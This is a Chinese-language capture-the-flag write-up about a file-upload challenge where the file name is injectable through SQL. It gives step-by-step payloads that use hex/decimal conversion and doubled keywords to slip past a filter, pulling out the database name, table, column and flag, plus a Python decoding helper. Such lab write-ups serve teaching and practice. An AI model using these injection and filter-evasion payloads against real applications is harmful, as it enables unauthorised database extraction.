ailx10说：这篇是我2025年1月写的。upload 这题真正让我停下来的不是文件内容，而是文件名。给它放一点算术，看返回的变化，才逐渐确认这里进了 SQL；之后数据库名、表和字段值都得拆成小片段，用十六进制和十进制绕一圈再还原。这篇把这些中间值和转换步骤留下，是怕以后只剩一长串输入，自己也看不出在问什么。它练的不是上传后找可执行文件，而是观察元数据怎样被后端使用；同一处名字，在不同语句位置里，需要处理的边界也不一样。

（1）这题不容易想到是SQL注入，获取数据库

```
'+(select substr(hex(database()),1,12))+'.jpg
```

![](/notes-assets/f819d6f0dfdf4e49df4c.webp)

- `database()` 返回当前数据库的名字
- `hex()` 将数据库名称转换为十六进制表示
- `substr(hex(database()),1,12)` 提取从第一个字符开始，长度为 12 的十六进制子字符串

![](/notes-assets/4535d37aac5f0cc709be.webp)

从结果可以看出，16进制的英文字符被截断了，因此，需要将16进制转换为10进制（备注：这里双写了select，实际不双写也是ok的，有点神奇）

```
' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
```

- `conv(..., 16, 10)` 是一个转换函数，它将一个数字从指定的进制

![](/notes-assets/4a3eda2cb4749d6d1860.webp)

将10进制的数字，转为16进制，再2个字符一组，得到对应的ASCII码字符，输出 web\_up

```
# 输入数字

num = 131277325825392



# 转换为十六进制（去掉前缀 '0x'）

hex_num = hex(num)[2:]



print(hex_num)



# 按 2 个字符一组分割，得到每个字节

ascii_chars = [chr(int(hex_num[i:i+2], 16)) for i in range(0, len(hex_num), 2)]



# 转换为字符串

ascii_string = ''.join(ascii_chars)



print(ascii_string)
```

同理，再从13开始，长度12，计算剩下的部分，得到数字 1819238756

```
' +(selselectect conv(substr(hex(database()),13,12),16,10))+ '.jpg
```

经过10进制转16进制，再转ASCII码对应的字符，得到 load，组合就得到数据库：web\_upload

（2）获取数据库中的表名，测试发现：第一个select不需要双写，第二个select需要双写

```
'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
```

![](/notes-assets/2b5374fa21f2ed245ad8.webp)

得到10进制数字 114784820031327，转换成字符串是 hello\_

重复上面动作，得到10进制数字 112615676665705，转换成字符串是 flag\_i

继续重复上面动作，得到10进制数字 126853610566245，转换成字符串是 s\_here

获得表名是： hello\_flag\_is\_here

（3）获取数据库表名中的字段

```
'+(selselectect CONV(substr(hex((selecselectt group_concat(column_name) frofromm information_schema.columns where table_name='hello_flag_is_here')),1,12),16,10))+'.jpg
```

![](/notes-assets/a58579efe5332b69ea3c.webp)

得到10进制数字 115858377367398，转换成字符串是 i\_am\_f

重复上面动作，得到10进制数字 7102823，转换成字符串是 lag

获得字段是：i\_am\_flag

（4）获取字段的值

```
'+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+'.jpg
```

![](/notes-assets/3373f50b89df4cceac3d.webp)

得到10进制数字 36427215695199，转换成字符串是 !!\_@m\_

重复上面动作，得到10进制数字 92806431727430，转换成字符串是 Th.e\_F

继续重复上面动作，得到10进制数字 560750951，转换成字符串是 !lag

获得flag 是： `!!_@m_Th.e_F!lag`

十六进制、十进制和字符之间来回转换，是为了让结果穿过题目的回显限制。每次只改一个位置，才能知道双写和转换究竟在哪一步产生了作用。
